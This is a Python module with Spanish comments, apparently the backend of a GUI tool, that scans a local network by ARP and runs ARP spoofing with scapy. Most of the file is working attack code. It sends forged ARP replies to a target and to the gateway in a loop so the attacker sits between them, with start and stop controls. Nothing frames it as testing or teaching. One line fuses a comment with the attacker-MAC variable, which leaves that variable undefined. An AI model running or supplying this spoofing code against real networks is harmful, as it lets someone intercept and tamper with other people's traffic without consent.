import socket
import subprocess
import time
import threading
from scapy.all import ARP, Ether, srp, send
from getmac import get_mac_address

# Intentamos cargar el lookup de vendor (opcional)
try:
    from mac_vendor_lookup import MacLookup
    vendor_lookup = MacLookup()
    vendor_lookup.update_vendors()
except ImportError:
    vendor_lookup = None

# Variables globales\mac_atacante = get_mac_address()
ip_puerta_enlace = None
ataque_en_curso = False

# --- Funciones de red ---
def init_gateway():
    """Detecta y asigna la IP de la puerta de enlace en Windows."""
    global ip_puerta_enlace
    res = subprocess.run(["netstat", "-rn"], capture_output=True, text=True)
    for linea in res.stdout.splitlines():
        if linea.startswith("0.0.0.0"):
            partes = linea.split()
            if len(partes) >= 3:
                ip_puerta_enlace = partes[2]
                break


def obtener_mac(ip):
    """Obtiene la MAC de una IP mediante ARP broadcast."""
    paquete = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    respuestas = srp(paquete, timeout=2, verbose=0)[0]
    for _, r in respuestas:
        return r.hwsrc
    return None

# --- ARP Spoofing ---
def start_spoof(ip_objetivo, callback):
    """Inicia el spoofing ARP en un hilo."""
    global ataque_en_curso
    ataque_en_curso = True
    thread = threading.Thread(target=_spoof_loop, args=(ip_objetivo, callback), daemon=True)
    thread.start()


def stop_spoof():
    """Detiene el spoofing ARP."""
    global ataque_en_curso
    ataque_en_curso = False


def _spoof_loop(ip_objetivo, callback):
    """Bucle interno que envía los paquetes ARP falsos."""
    mac_obj = obtener_mac(ip_objetivo)
    if not mac_obj:
        callback(f"No se pudo obtener MAC para {ip_objetivo}.\n")
        return

    callback(f"MAC {ip_objetivo}: {mac_obj}\n")
    pkt_obj = ARP(pdst=ip_objetivo, hwdst=mac_obj, psrc=ip_puerta_enlace, hwsrc=mac_atacante, op=2)
    pkt_gate = ARP(pdst=ip_puerta_enlace, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_objetivo, hwsrc=mac_atacante, op=2)

    while ataque_en_curso:
        send(pkt_obj, verbose=0)
        send(pkt_gate, verbose=0)
        callback(f"Spoofing {ip_objetivo}...\n")
        time.sleep(2)

# --- Escaneo de red ---
def scan_network(subnet, callback_row, callback_status):
    """Escanea la subred con ARP, invoca callback_row por cada dispositivo, y callback_status al final."""
    callback_status("Escaneando...")
    paquete = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet)
    respuestas = srp(paquete, timeout=2, verbose=0)[0]
    for _, r in respuestas:
        ip = r.psrc
        mac = r.hwsrc
        try:
            nombre = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            nombre = "-"
        vendor = vendor_lookup.lookup(mac) if vendor_lookup else "-"
        callback_row(ip, mac, nombre, vendor)
    callback_status(f"{len(respuestas)} dispositivos encontrados")
